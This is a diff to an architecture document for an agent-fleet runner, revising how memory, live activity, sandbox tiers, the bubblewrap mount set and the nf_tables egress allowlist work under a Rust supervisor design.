-The first four make the daemon's own credentials and host privileges unreachable from inside a hostile fleet; the fifth makes containment escape-proof against a child that forks to survive; the last keeps the engine's own transport alive inside the cage. Network egress is the orthogonal layer — see the egress model below.
+Network egress is the orthogonal layer; see §Egress model.
 
 ### Multi-run events
 
-A *run* is one NullClaw execution inside one language-model context window. When a single event needs more reasoning than one window holds, NullClaw stops at `stage_chunk_threshold` (0.75 of the context cap), checkpoints, and signals "resume me." `agentsfleetd` enqueues a **continuation event** chained by `resumes_event_id`, and the next lease resumes from the checkpoint in a fresh window. One lease = one run.
+One lease is one run. The agent loop does not split a run across leases: at `stage_chunk_threshold` of the model's context window it stops offering tools and asks the model to answer with what it has (`rustd/crates/afr_agent/src/context.rs`). A report's outcome is `processed` or `fleet_error` and never asks to be resumed (`rustd/crates/afd_wire/src/report.rs`).
 
-```
-trigger event E0 ─► RUN 1 (lease, checkpoint=∅) ─► NullClaw hits 0.75 cap ─► report{continue, C1}
-                                                          │ agentsfleetd persists checkpoint C1,
-                                                          │ enqueues continuation (resumes_event_id=E0)
-                ─► RUN 2 (lease, checkpoint=C1) ─► … ─► report{continue, C2}
-                ─► RUN 3 (lease, checkpoint=C2) ─► NullClaw finishes ─► report{processed}
-```
-
-Durable state across runs is the checkpoint in `agentsfleetd`, never runner-local — which is why a different runner can pick up run 2. There is no continuation-chain cap; a runaway run is bounded by the fleet's `budget` caps and the lease runtime deadline instead. Sticky routing (below) prefers the runner that ran the previous run, but correctness never depends on it.
+A continuation event still exists, chained by `resumes_event_id`: an approval's answer writes one, and the next lease runs it (`rustd/crates/afd_approval/src/inbox/resolve.rs`). Durable state across runs is in `agentsfleetd`, never runner-local, which is why any runner can take the next event. Sticky routing (below) prefers the runner that ran the previous one, but correctness never depends on it.
 
 ## Memory continuity — durable fleet memory rides the trusted plane
 
-Memory is the second kind of cross-run state, under the same law as the checkpoint: **durable fleet memory lives only behind `agentsfleetd` — never in the runner, never in the fleet.** The runner reaches it through `agentsfleetd`'s runner API alone and holds no credential for any store; Postgres is the default store and the only one built, behind `afd_memory::MemoryStore` (§"Memory backends and scope"). The checkpoint carries run-continuity (where a chunked incident left off). Memory carries the fleet's learned knowledge: the `memory_store` / `memory_recall` durable scratchpad. Both are hydrated into a run and captured out of it; neither is ever runner-local-durable.
+Memory is the second kind of cross-run state, under the same law as the checkpoint: **durable fleet memory lives only behind `agentsfleetd` — never in the runner, never in the fleet.** The runner reaches it through `agentsfleetd`'s runner API alone and holds no credential for any store; Postgres is the default store and the only one built, behind `afd_memory::MemoryStore` (§"Memory backends and scope"). The checkpoint records the last event and answer; it is saved, and no lease carries it yet ([Runner execution](./runner_execution.md) §"Workspace between leases"). Memory carries the fleet's learned knowledge: the `memory_store` / `memory_recall` durable scratchpad. It is hydrated into a run and captured out of it, and is never runner-local-durable.
 
-The sandboxed child holds **no** `agt_r` token, **no** control-plane URL, and **no** Data Source Name (DSN) — so a prompt-injected fleet cannot be talked into "reach your memory endpoint": none exists inside it. The fleet's in-run working store is **SQLite in `:memory:` mode** (no on-disk file). Durability is the parent's job, over the same `agt_r` `/v1/runners` plane that already carries leases and reports — two endpoints, both fencing-verified like `/reports`:
+The memory tools run in the supervisor, so a sandbox holds **no** `agt_r` token, **no** control-plane URL, **no** Data Source Name (DSN) and no memory: a prompt-injected fleet cannot be talked into "reach your memory endpoint", because none exists inside it. The run's working store is `afr_memory::Hydrated`, in the supervisor's memory, with no on-disk file. Durability is the supervisor's job, over the same `agt_r` `/v1/runners` plane that already carries leases and reports, through two endpoints, both fencing-verified like `/reports`:
 
 | Verb | Path | Direction | What |
 |------|------|-----------|------|
-| `GET`  | `/v1/runners/me/memory/{fleet_id}` | hydrate (control plane → parent → child) | the parent fetches a **category-pinned hydration window** of that lease's fleet's prior memory and seeds the child's `:memory:` store at run start: every `core` entry that fits the byte budget hydrates before any non-core entry is considered, the remaining budget fills with the newest non-core entries, and the cold tail stays durable in Postgres. The fleet is named by the lease's `fleet_id` (M84_005), so resolution does **not** depend on a single live lease — a pooled runner (M88_002) holding N leases hydrates each fleet independently |
-| `POST` | `/v1/runners/me/memory/{fleet_id}` | capture (child → parent → control plane) | the parent pushes the run's memory (`lease_id` + `fencing_token` in the body, like `report`, to fence the write); `agentsfleetd` persists it under `SET ROLE memory_runtime` (the same datastore role the tenant memory write uses) |
+| `GET`  | `/v1/runners/me/memory/{fleet_id}` | hydrate (control plane → supervisor) | the supervisor fetches a **category-pinned hydration window** of that lease's fleet's prior memory and seeds the run's store at run start: every `core` entry that fits the byte budget hydrates before any non-core entry is considered, the remaining budget fills with the newest non-core entries, and the cold tail stays durable in Postgres. The fleet is named by the lease's `fleet_id` (M84_005), so resolution does **not** depend on a single live lease — a pooled runner (M88_002) holding N leases hydrates each fleet independently |
+| `POST` | `/v1/runners/me/memory/{fleet_id}` | capture (supervisor → control plane) | the supervisor pushes the run's memory (`lease_id` + `fencing_token` in the body, like `report`, to fence the write); `agentsfleetd` persists it under `SET ROLE memory_runtime` (the same datastore role the tenant memory write uses) |
 
 ```
         ┌───────────────────────────────────────────────────────────────┐
@@ -468,35 +454,36 @@ The sandboxed child holds **no** `agt_r` token, **no** control-plane URL, and **
           [agt_r + fencing]               [agt_r + fencing]
                    │                             │
         ┌─────────────────────────────────────────────────────────────┐
-        │  agentsfleet-runner PARENT (trusted) — holds the agt_r      │
+        │  agentsfleet-runner SUPERVISOR (trusted): holds the agt_r   │
+        │  the agent loop and the memory tools run here;              │
+        │  in-run store = afr_memory::Hydrated (no disk file)         │
+        │  fleet calls memory_recall() / memory_store()               │
         └─────────────────────────────────────────────────────────────┘
-            pipe ↓ prior memory (stdin)     pipe ↑ memory frame (stdout)
-        ╔══════════════════════════════════════════════════════╗  ← SANDBOX
-        ║  sandboxed child (NullClaw) — NO token, URL, or DSN  ║     BOUNDARY
-        ║  in-run store = SQLite :memory:  (no disk file)      ║
-        ║  fleet calls memory_recall() / memory_store()        ║
-        ╚══════════════════════════════════════════════════════╝
+            executor socket ↓ tool calls only
+        ╔═════════════════════════════════════════════════════════════╗
+        ║  sandbox: tool calls only; NO token, URL, DSN or memory     ║  ← SANDBOX BOUNDARY
+        ╚═════════════════════════════════════════════════════════════╝
 ```
 
 **The carry-over — one fleet, two runs:**
 
 ```
 RUN 1  (first ever for fleet A)
-  lease{ fleet=A, fence=7 } → runner parent
-  parent ─GET /me/memory─►  []                 (empty: nothing stored yet)
-  parent ─pipe─►  child seeds an EMPTY :memory: store
+  lease{ fleet=A, fence=7 } → runner supervisor
+  supervisor ─GET /me/memory─►  []             (empty: nothing stored yet)
+  supervisor seeds the run's EMPTY store
   fleet:  memory_store("todo", "step 3 of 5"),  memory_store("prefs", …)
   run-end  +  every memory_checkpoint_every:
-     runner lists its :memory: store → deltas ─pipe─► parent
-     parent ─POST /me/memory─►  agentsfleetd INSERTs rows   (fleet_id = A)
-  child exits → :memory: store vanishes (no disk artifact)
+     the run's store → deltas
+     supervisor ─POST /me/memory─►  agentsfleetd INSERTs rows   (fleet_id = A)
+  run ends → the run's store is dropped (no disk file)
 
   Postgres now holds:   A · todo · "step 3 of 5"    |    A · prefs · …
 
 RUN 2  (next run, same fleet A)                          ◄── THE CARRY-OVER
-  lease{ fleet=A, fence=8 } → runner parent
-  parent ─GET /me/memory─►  [todo, prefs]      (run 1's memory)
-  parent ─pipe─►  child seeds :memory: WITH those entries
+  lease{ fleet=A, fence=8 } → runner supervisor
+  supervisor ─GET /me/memory─►  [todo, prefs]  (run 1's memory)
+  supervisor seeds the run's store WITH those entries
   fleet:  memory_recall("todo") → "step 3 of 5"   → continues from step 3
           memory_store("todo", "step 5 of 5")     (same key → UPDATE)
   push → agentsfleetd UPDATEs (todo, A) + INSERTs any new keys (idempotent)
@@ -506,7 +493,7 @@ RUN 2  (next run, same fleet A)                          ◄── THE CARRY-OVE
 
 **Multi-lease isolation invariant.** Concurrent-lease safety (M88_002's worker pool) rests on the per-fleet **affinity slot admitting a single live holder** — `fleet.runner_affinity` keyed by its `fleet_id` primary key + the `leased_until < now` time-gate — plus **capture-time `fencing_token`** rejecting a stale holder. (It is *not* a unique constraint on `fleet.runner_leases`. Multiple lease rows per fleet are normal, and a slow old holder can transiently coexist with a reclaimer. That is why fencing exists: only one writer durably persists into a fleet's namespace.) So a runner's N concurrent leases are always N *distinct* fleets, which means N distinct namespaces. Isolation does **not** rest on `fleet_id` scoping alone: a future retry / speculative / failover / takeover-lease feature that broke the single-live-holder property would have to scope memory by `lease_id` first. Keep this invariant load-bearing. A held sandbox ([Runner Execution](./runner_execution.md) §"Workspace between leases") keeps it: the hold gives its runner a head start at the slot, never the slot, and the holder claims through the same fencing-guarded statement. The decided workspace scope (§"Memory backends and scope") gives one workspace key many live writers by design, so its fencing token will prove a live lease, not a sole writer; the memory work defines how concurrent writes to one key resolve.
 
-**Cadence.** The parent pushes at **run end** (mandatory) and **mid-run** on the existing `memory_checkpoint_every` cadence, so a long run's learned memory is durable before the run finishes — a crash loses at most the work since the last checkpoint push. Because the run-end push lands before `report`, a continuation run (above) hydrates the snapshot the previous run just stored.
+**Cadence.** The supervisor pushes at **run end** (mandatory) and **mid-run** on the existing `memory_checkpoint_every` cadence, so a long run's learned memory is durable before the run finishes — a crash loses at most the work since the last checkpoint push. Because the run-end push lands before `report`, the fleet's next run hydrates the snapshot the previous run just stored.
 
 **Selection policy.** Hydration is a deterministic, category-pinned byte window — a pure function of (rows, budget). The `core` tier is pinned: every `core` entry, newest-first, within the byte budget. The newest non-core entries fill the remainder. Unknown and custom categories are windowed, never silently pinned. Cap eviction orders the same way — the coldest non-core rows are evicted first, and a `core` row is evicted only when no non-core row remains — so a fact stored once as `core` survives both the window and the cap. No search infrastructure, no scoring: the fleet's own discipline (stable keys, `core` for load-bearing facts, `memory_forget` for stale entries — see [*capabilities.md*](./capabilities.md) §4 memory hygiene) is the primary bound. A dedicated, scalable memory store remains the post-launch direction; the `GET` endpoint is the seam it swaps in behind, with no change to the fleet.
 
@@ -541,10 +528,10 @@ runner ── GET/POST /v1/runners/me/memory ──► agentsfleetd ── store
 
 ## Live activity (the SSE tail)
 
-NullClaw emits progress frames mid-run (tool started, response chunk, tool completed). The runner holds no Dragonfly, so the child emits frames over its stdout pipe (`src/runner/pipe_proto.zig`, length-prefixed typed frames, `A` = activity, `R` = result, multiplexed because stdout crosses bwrap cleanly). The parent batches each `A` frame into a bounded, per-lease sender queue; its sender thread posts to `agentsfleetd` over the `activity` verb without making the child reader wait for activity HTTP. When a slow post leaves all four waiting slots full, the next batch is appended to the newest waiting slot while it fits in 64 KiB, so a stall costs latency rather than text; only a batch that fits nowhere is refused, counted, and logged as `activity_batch_dropped` (`src/runner/daemon/ActivitySender.zig`). That log covers queue refusals only. A post that fails loses its batch without touching the drop count (`control_plane_client.zig` swallows the error): one cancelled by its deadline logs a warning, `cp_call_deadline_fired`, which names the deadline but no lease and fires for any control-plane call; any other transport failure, and a non-2xx answer, log nothing. Zero drops in the journal therefore does not prove a complete tail. `afd_fleet`'s activity path publishes the ordered batch on the `fleet:{id}:activity` channel `afd_sse` names. The hub shares one Dragonfly subscription connection across downstream Server-Sent Events (SSE) viewers.
+The agent loop emits progress frames mid-run: tool started, tool completed, and each answer chunk. The runner holds no Dragonfly, so the supervisor hands each frame to a per-lease sink that never blocks the run, and a pump batches frames up to 64 KiB, flushing every 250 ms. At most four batches are queued or in flight; past that the next batch waits with the batcher and keeps filling, and only a batch that filled while it waited is dropped, counted and logged as `activity_batch_dropped`. A post that fails loses its batch, logs `activity_frame_write_failed` and counts its frames as dropped (`rustd/crates/afr_supervisor/src/activity.rs`). `afd_fleet`'s activity path publishes the ordered batch on the `fleet:{id}:activity` channel `afd_sse` names. The hub shares one Dragonfly subscription connection across downstream Server-Sent Events (SSE) viewers.
 
 ```
-NullClaw child ─pipe(A frames)─► runner parent ─POST .../activity (no ack)─► agentsfleetd ─PUBLISH─► SSE
+agent loop ─sink─► activity pump ─POST .../activity (no ack)─► agentsfleetd ─PUBLISH─► SSE
 ```
 
 The runner's frames reach the channel in this shape (`afd_fleet::lease::activity`), each stamped with the `event_id` its lease runs:
@@ -560,7 +547,7 @@ Every call ends exactly once. When a run ends for any reason, the runner emits `
 
 Each call's full arguments and output (up to 64 KiB each, 1 MiB per run, under the same scrub) ride neither the live tail nor the report. The runner posts them in batches of at most 256 KiB to `POST /v1/runners/me/leases/{lease_id}/tool-calls` under the lease's fencing token, before the report, which keeps the report far below the runner routes' 2 MB request limit (axum's default; `afd_api/src/router/mount.rs` sets no other). The daemon stores them in `core.fleet_tool_call_details`, a child table of `core.fleet_events`, keyed by fence and call number, and settlement deletes the event's rows from every other fence, because a reclaimed lease restarts its call numbers at 1. A failed post costs only the full view; the run settles as before.
 
-`call_id` is the runner's own counter for the run, minted when a call starts and repeated on each of its frames. NullClaw's observer drops the provider's `tool_call_id`, so the runner cannot forward that one. The daemon accepts `call_id` as optional and bounded by `CALL_ID_MAX_BYTES`, and publishes it as `{fence}:{call_id}` under the lease's fencing token: a reclaimed lease re-runs the same event from a fresh runner whose counter restarts at 1, and the fence keeps its calls apart from the dead lease's. The activity structs refuse unknown fields, so a runner sending `call_id` needs a daemon that reads it; both ship in one release, and the release workflow deploys the Fly daemons before the metal runners (`deploy-metal-canary-prod` needs `deploy-fly-prod`). The outcome fields and the report's `tool_calls` follow the same order, with a sharper edge: an older daemon refuses a whole report that carries `tool_calls`, so rolling the daemon back below the release that added it needs the runners rolled back first. The sandbox hold adds two more fields with the same edge: an older daemon refuses a report that carries `held_until_ms`, and reads every heartbeat that carries `holds` as no report at all, dropping its capability report with it. So the daemon ships before its runners, and rolls back after them. A browser pairs a call's frames by `call_id`; a frame from an older runner has none and pairs by name and timing.
+`call_id` is the runner's own counter for the run, minted when a call starts and repeated on each of its frames (`rustd/crates/afr_agent/src/ledger.rs`). The daemon accepts `call_id` as optional and bounded by `CALL_ID_MAX_BYTES`, and publishes it as `{fence}:{call_id}` under the lease's fencing token: a reclaimed lease re-runs the same event from a fresh runner whose counter restarts at 1, and the fence keeps its calls apart from the dead lease's. The activity structs refuse unknown fields, so a runner sending `call_id` needs a daemon that reads it; both ship in one release, and the release workflow deploys the Fly daemons before the metal runners (`deploy-metal-canary-prod` needs `deploy-fly-prod`). The outcome fields and the report's `tool_calls` follow the same order, with a sharper edge: an older daemon refuses a whole report that carries `tool_calls`, so rolling the daemon back below the release that added it needs the runners rolled back first. The sandbox hold adds two more fields with the same edge: an older daemon refuses a report that carries `held_until_ms`, and reads every heartbeat that carries `holds` as no report at all, dropping its capability report with it. So the daemon ships before its runners, and rolls back after them. A browser pairs a call's frames by `call_id`; a frame from an older runner has none and pairs by name and timing.
 
 Two planes, kept apart on purpose: **activity** is ephemeral and best-effort (a dropped frame is cosmetic); **report** is the durable system of record. The live tail is never the source of truth. The runner reports the durable outcome before waiting for its activity sender to drain, so a cold activity connection cannot delay settlement; a late activity frame may arrive after completion. A cold DNS or TCP connect still precedes the sender's socket deadline and can hold a worker at the post-report join. Runner chunks carry a pass start marker, contiguous-delivery flag, and sequence number. The browser rejects a gap, ignores activity after completion, and reads the durable event detail to settle the final answer. Its reply decoder uses Hermes protocol parsing and incremental HTML tokenization to keep reasoning and tool protocol out of the visible answer; after the first visible delta, it batches display updates at a 50 ms interval. The bracket frames are published by `agentsfleetd` itself (`afd_fleet::lease::bracket`, shapes in `afd_api_wire::tail::TailFrame`), so the tail has open/close markers even before the runner forwards a single mid-run frame:
 
@@ -630,81 +617,73 @@ The lease clears on exactly two exits, both after a won claim. **Drained:** the 
 
 ## Sandbox tiers
 
-This section describes the Zig runner's tiers. The Rust runner's engines are in [Runner execution](./runner_execution.md) §"Sandbox engines".
+The control plane ASSIGNS a tier to each runner row (Add Runner / the fleet PATCH) and delivers it with the runner's identity on enrollment and every heartbeat. The host probes what its kernel can enforce and reports that upward. A host whose report cannot satisfy its assignment is marked degraded and issued no work (§Assigned policy and reconciliation). The capability report stays unauthenticated self-assertion, so trust for placement remains operator-assigned, not host-claimed. Only tiers with real enforcement are assignable (`rustd/crates/afd_wire/src/runner.rs`).
 
-The control plane ASSIGNS a tier to each runner row (Add Runner / the fleet PATCH) and delivers it with the runner's identity on enrollment and every heartbeat; the host applies it, probes what its kernel can actually enforce, and reports that upward. A host whose report cannot satisfy its assignment is marked degraded and issued no work (§Assigned policy and reconciliation). The capability report stays unauthenticated self-assertion, so trust for placement remains operator-assigned, not host-claimed. A production startup guard refuses `dev_none` (or an unknown tier) in a release build, so the weakest tier cannot become the production default. Only tiers with real enforcement are assignable.
-
-| `sandbox_tier` | Where | Eligible for |
+| `sandbox_tier` | Where | What the daemon demands of the report |
 |---|---|---|
-| `landlock_full` | Linux host | any work |
-| `container_nested` | runner inside a container on a Linux host or VM (Virtual Machine) | any work — full sandbox, nested |
-| `dev_none` | no real sandbox; refused in release builds | own-tenant dev work |
+| `landlock_full` | Linux host | Landlock, seccomp, bubblewrap and every required cgroup controller |
+| `container_nested` | runner inside a container on a Linux host or VM (Virtual Machine) | the same set: the sandbox applies Landlock on every tier |
+| `dev_none` | development | nothing; a policy other than `allow_all` reads degraded under it, because only a sandbox enforces one |
 
-On a Mac, running `agentsfleet-runner` inside a Linux VM (Docker Desktop / OrbStack / Lima) is how a laptop earns `container_nested` — there is no macOS-native tier (the Seatbelt tier was removed: it never had enforcement code, and a tier that cannot be applied must not be assignable).
+The runner builds the same bubblewrap sandbox under every tier, and a host that cannot build one refuses `run` at boot ([Runner execution](./runner_execution.md) §"Sandbox engines"). The tier labels the self-test and sets what the daemon's reconcile demands (`rustd/crates/afd_runner/src/reconcile.rs`). On a Mac, `agentsfleet-runner` runs inside a Linux VM (Docker Desktop / OrbStack / Lima); there is no macOS engine.
 
-> **Tiers ≠ egress policy.** `sandbox_tier` reports *isolation strength* (filesystem / syscall / process) — it is **orthogonal** to network egress. `landlock_full` does not constrain which hosts the child reaches (Landlock governs the filesystem; its recent network support is TCP *port* binding/connect only, not host allowlisting). `container_nested` gives a ready net-namespace boundary that the egress model can build on, but still needs the allowlist. So none of the tiers substitutes for the egress model below.
+> **Tiers ≠ egress policy.** `sandbox_tier` reports *isolation strength* (file system / system call / process) — it is **orthogonal** to network egress. Landlock governs the file system; its network support is TCP *port* binding and connecting only, not host allowlisting. So no tier substitutes for the egress model below.
 
 ## The sandbox filesystem contract
 
-A sandboxed lease sees a mount namespace the daemon builds from a **declared** set of host paths. The set is two layers, and the split is the security property: a daemon-owned baseline that no assignment can touch, plus an operator list that may only **append** to it.
+A sandbox sees a mount namespace bubblewrap builds from a fixed set, in one order (`rustd/crates/afr_sandbox/src/bubblewrap.rs`):
 
-The baseline is `contract.protocol.BASELINE_RO_PATHS`, bound read-only (`--ro-bind-try`, so a path absent on this host is skipped rather than failing the lease). This table is the contract, and `test_architecture_doc_matches_the_contract` fails if it drifts from the constant — the list below is not documentation *about* the code, it is checked *against* it.
-
-| Host path | Mode | Why the sandbox needs it |
+| Inside | From | Mode |
 |---|---|---|
-| `/etc/ssl/certs` | read-only | The certificate bundle a credentialed dial verifies against — the only filesystem input the inference call needs |
-| `/etc/resolv.conf` | symlink | **Not a bind.** Recreated as a link into the directory below, because bwrap resolves a symlink when it binds and would drop the target file into an `/etc` landlock does not cover — measured on a real host as `resolver=0 dns=0 egress=0`, every lease losing name resolution |
-| `/etc/hosts` | read-only | Static name resolution, consulted before the resolver |
-| `/run/systemd/resolve` | read-only | The systemd-resolved stub `resolv.conf` that `/etc/resolv.conf` symlinks to. Without it the symlink dangles inside every lease and **all** DNS fails `HostResolutionFailed` regardless of network policy — the M167 incident |
-| `/etc/nsswitch.conf` | read-only | Name-service switch configuration. The transport resolves hostnames through the host libc, which reads this to know it may consult DNS at all |
-| `/usr` | read-only | The engine's model transport and the `http_request` tool both spawn `curl`; this carries the binary and its shared libraries |
-| `/lib` | read-only | Shared libraries the transport links, on hosts that have not merged `/lib` into `/usr` |
-| `/lib64` | read-only | As `/lib`, for the 64-bit loader path |
-| `/bin` | read-only | Executable path on hosts that have not merged `/bin` into `/usr` |
-| `/sbin` | read-only | As `/bin`, for the system executable path |
+| `/` | the admitted toolbox image's mount | read-only |
+| `/proc`, `/dev` | a fresh `/proc` for the sandbox's process namespace, a minimal device tree | as bubblewrap mounts them |
+| `/dev/shm` | a private tmpfs, a quarter of the lease's memory | read-write, `1777` |
+| `/tmp` | the workspace disk's `tmp/` directory | read-write |
+| `/run` | a private tmpfs | read-write |
+| `/workspace` | the workspace disk's `workspace/` directory | read-write |
+| `/run/agentsfleet` | the lease's socket directory | read-write, owned by the sandbox user |
+| `/opt/agentsfleet/agentsfleet-runner` | the runner binary | read-only |
+| `/etc/hosts`, `/etc/resolv.conf` | the lease's rendered resolver files, under `allow_list_egress` only | read-only |
 
-This list was seven broad trees — `/etc`, `/usr`, `/lib`, `/lib64`, `/bin`, `/sbin`, `/opt` — and **two of them carried credentials into every lease**. `/etc` brought the host account database; `/opt` brought the daemon's own installation directory, whose `.env` holds the control-plane token. Nothing a lease runs reads either, so both are gone and only the specific `/etc` files a lease does read are named individually. That is the narrowing that held.
+Everything else a lease reads, `/etc` and the certificate store included, comes from the toolbox image, so no host file reaches a sandbox unless this table names it. Landlock then narrows writes to `/workspace`, `/tmp`, `/dev/pts` and `/dev/shm`, plus the single devices a shell opens: `/dev/null`, `/dev/zero`, `/dev/full`, `/dev/tty` and `/dev/ptmx` (`rustd/crates/afr_sandbox/src/harden.rs`).
 
-The executable trees are a separate question, and the first answer was wrong. It reasoned that the runner binary is statically linked and rides its own single-file bind — true — and concluded a lease needs no executable at all. That holds only if the runner is the sole thing running in a lease, and it is not: the lease child runs the NullClaw engine, whose model transport spawns `curl` (ten provider modules reach `sse.curlStream*` / `http_util.curlPost*`), as does the `http_request` tool. Unbound, `curl` and its libraries are absent and **every lease dies at `execvp` before its first model call**. The measurement said to prove otherwise did not: the self-test's egress check opens a TCP stream and closes it ("this proves reachability, it does not speak a protocol") from inside the statically-linked runner, so it confirmed the one path that needs no executable. Removing the `curl` dependency — an in-process transport upstream, or a vetted static binary on its own single-file bind — is what would let these trees leave for good.
-
-The replacement measurement runs the executable instead of reasoning about it. A dynamically linked binary is executed **inside a composed lease** and must exit zero; the same command in the same argv with only the system-core bind triples removed must exit non-zero. Both arms are required, because a green first arm alone stays green if the command would have run anywhere or the argv never applied — which is the shape of evidence the withdrawn claim rested on. The trust store is read from inside the lease for the same reason: `/etc/ssl/certs` is largely symlinks into `/usr/share/ca-certificates`, so a bound directory whose targets are unreachable would pass a bind-list check and fail every certificate verification. Where the host carries a `curl`, the real transport binary is executed too.
-
-**The runner now measures this on every heartbeat rather than the milestone reasoning about it once.** The self-test parent resolves the host's transport binary and passes it to the probe, which spawns it from behind the full wall — `no_new_privs` → landlock → seccomp — and reports a named check an operator can act on. A host carrying no transport at all reads as a fault with its own message, distinct from one whose exec was attempted and refused: "install curl" and "fix the bind set" are different repairs, and collapsing them would send an operator to the wrong one. The consequence is deliberate — a runner on a host with no transport reads unhealthy, because no lease there can reach a model.
-
-The probe spawns with a raw `fork` + `execve` rather than the standard library's spawn helper. That helper adds pipe, `dup2` and `setpgid` steps which fail inside a lease for reasons that have nothing to do with whether the transport can run, and the first version of this check reported a broken sandbox on a working one. A check that cannot separate its own plumbing from the fault it looks for is worse than no check.
-
-Beyond the baseline the bwrap argv establishes the sandbox's own floor (a private `/proc`, `/dev`, one `tmpfs` per `BASELINE_RW_TMPFS` entry — today `/tmp` — and the child's `CHILD_HOME` directory on that floor), emits the `/etc/resolv.conf` symlink, ro-binds the runner binary so the sandbox can exec it, and binds the lease workspace read-write. **The workspace is the only writable bind unless an operator named another one; the tmpfs floor is the sandbox's own writable scratch, private per lease and gone at exit.**
-
-The in-child landlock ruleset **derives its read set from the same contract** (`BASELINE_RO_PATHS` plus the floor paths above) **and its write set from the same shared tmpfs floor** (`BASELINE_RW_TMPFS`), and the parent forwards operator binds to the child on mode-explicit argv flags so landlock admits them at their assigned mode. The write side earned its derivation the same way the read side did: `/tmp` was writable at the mount and read-only in a hand-kept landlock list, so the engine's credentialed dials — which write each call's authorization header to a scratch file precisely so tokens never ride argv — died at the first `createFile` (`TempFileCreateFailed`) while every list test stayed green. The floor is comptime-asserted to sit inside `SENSITIVE_PATHS`, so an operator bind can never shadow it, and the self-test probe now creates and removes a scratch file under full lease hardening so this fault class is detected by a probe rather than assumed from the lists agreeing. The write set also names the device files a lease writes — `/dev/null` today, granted per FILE on top of the read-only floor rather than by widening `/dev`, which would hand every lease write on every node `--dev` builds. That entry earned its place the same way: `--dev` mounts the node writable, the floor granted `/dev` read-only, and the engine's transport spawn wires an ignored stdio stream through it — so on the development runner every lease died at `open("/dev/null", O_RDWR) = EACCES` at zero tokens and zero wall seconds, while six self-test checks stayed green because executing the transport and wiring its stdio are different permissions and only the first was measured. The probe now opens that set for writing under full lease hardening, from the one list the policy layer grants from. A parallel landlock list once omitted `/run/systemd/resolve` after bwrap gained it: the mount existed and the read was denied, so every lease's DNS failed while the self-test — then outside the landlock wall — graded the resolver healthy. The self-test probe now applies the lease child's exact hardening (`no_new_privs` → landlock → seccomp) before any check, and with no registry declared it resolves the control-plane host (resolve, never dial) so DNS is exercised even on a default assignment.
-
-An operator may add paths through the assigned policy's extra-bind list, each carrying its own mode and a note. Two rules keep the baseline intact:
-
-- **Additive only.** An entry that overlaps a protected path *in either direction* is refused — naming it outright (`/etc`), nesting under it (`/etc/ssl`), or containing it (`/run` contains `/run/systemd/resolve`). bwrap applies binds in argv order and the last operation on a target wins, so without this an appended entry would silently re-mode the daemon's own mount.
-- **Closed by default.** The mode is explicit, and an assignment that omits it decodes as `read_only`, so an older or malformed control plane cannot widen access by omission.
-
-`read_write` is assignable and is a real widening: tenant agent code can modify host state outside its workspace on **every lease that runner takes**, so the blast radius is per-runner, not per-lease. It is bounded by being named rather than defaulted, by the operator note that travels with it, and by the self-test reporting each entry with its mode so a writable mount is never silent.
+The assigned policy carries an operator list of extra binds, each with a mode and a note. The daemon validates and stores it, and the dashboard refuses an entry that overlaps a protected path. The runner binds none of them: the table above is the whole host surface.
 
 ## Egress model — outbound is the only network surface
 
-The runner box is **outbound-only**: it runs no inbound listener (the daemon dials the control plane via an outbound `std.http.Client`; see §Datastore role model), and holds no co-located datastore. So the network threat is entirely **outbound secret exfiltration** — the sandboxed fleet legitimately holds the lease's inference `api_key` and tool secrets (e.g. a GitHub token), and the fleet's *only* required egress is its inference endpoint (or a gateway) plus operator-declared `allow_hosts` for tools.
+The runner box is **outbound-only**: it runs no inbound listener (the supervisor dials the control plane over HTTPS; see §Datastore role model) and holds no co-located datastore. No model key or minted token enters a sandbox, so the network threat from a sandbox is a tenant program sending the workspace's contents, or anything it computes, somewhere it should not, or reaching an internal address.
 
-Three network policies:
+Three network policies, assigned per runner (`rustd/crates/afd_wire/src/runner.rs`):
 
-- **`allow_all` (current default)** — the child re-shares the host network namespace with `--share-net`, so all outbound egress is allowed. This is the interim compatibility posture, not the final hardening posture.
-- **`deny_all_egress`** — the child's net namespace is unshared (`--unshare-all`) with **no veth**; it reaches nothing. Correct for non-network fleets and isolation demos.
-- **`allow_list_egress` (enforced allow-list)** — the child keeps its **own** unshared net namespace connected to the host by a single **veth pair** (`uzveth<worker>` ↔ peer, point-to-point `10.69.<worker>.0/30`). The parent installs **default-deny `nftables` rules in the host netns, on the host-side veth**. They are root-owned (Invariant 6) and never live inside the child's netns, which the child could `nft flush`. Egress is permitted only to the **IP set resolved at lease setup** from the merged allowlist. Everything else — arbitrary exfil targets, raw IPs, link-local, private ranges — is dropped at the kernel. The operator's declared `allow_hosts` becomes a real packet-time boundary, not a log line. The current runner recognizes this policy name but refuses leases fail-closed until the egress setup path is wired.
+- **`allow_all`** — the sandbox shares the host network namespace with `--share-net`, so all outbound egress is allowed.
+- **`deny_all_egress`** — the sandbox's own network namespace, with loopback only; it reaches nothing. A missing assignment gets the same, because a runner never opens egress on missing input.
+- **`allow_list_egress` (enforced allowlist)** — the sandbox keeps its **own** network namespace, joined to the host by one **veth pair**, `afv<slot>`, point-to-point `10.69.<slot>.0/30` (host `.1`, sandbox `.2`), slot `0..=253`. The runner installs **default-deny nf_tables rules in the host namespace**, on the host side of the pair. They are owned by root and never live inside the sandbox's namespace, so `nft flush ruleset` inside it changes nothing. Egress is permitted only to the IPv4 set resolved at lease bind. Everything else is dropped at the kernel: arbitrary exfiltration targets, raw addresses, link-local and private ranges.
 
-**The merged allowlist (one source for Layer 4 (L4) + Layer 7 (L7)).** `network/AllowList.build` merges, deduped first-seen: the lease's inference endpoint host ∪ the package-registry baseline from runner config (falling back to `AllowList.DEFAULT_REGISTRY`'s 8 package registries) ∪ the per-fleet `network.allow`. The **same** `AllowList` feeds both the kernel `nftables` set (L4) and the `http_request`/`web_fetch` tool checks (L7), so the two can never disagree.
+**One table per sandbox, scoped to its link.** The table is `inet afegress<slot>`, built over netlink from Rust, never through the `nft` or `ip` binaries. It holds the set of allowed addresses and three chains:
 
-**The inference host is control-plane-authored — no parent-side drift.** The allowlist must permit exactly the host the fleet's LLM call dials. The provider→URL map lives in NullClaw's `providers/factory.zig` (`compatibleProviderUrl`); `agentsfleetd` reads **that** table (not a copy) when it resolves the execution policy in `afd_credential`, extracts the host, and carries it on the lease as `ExecutionPolicy.inference_host`. The runner allowlists exactly what the engine reaches.
+| Chain | Hook | Rules, every one scoped to `afv<slot>` |
+|---|---|---|
+| forward | forward, policy accept | from the sandbox: drop TCP and UDP port 53, accept the set, drop the rest; to the sandbox: accept from the set, drop the rest |
+| input | input, policy accept | drop anything arriving from the sandbox's link |
+| postrouting | postrouting, network address translation | masquerade the `/30` out of any other interface |
 
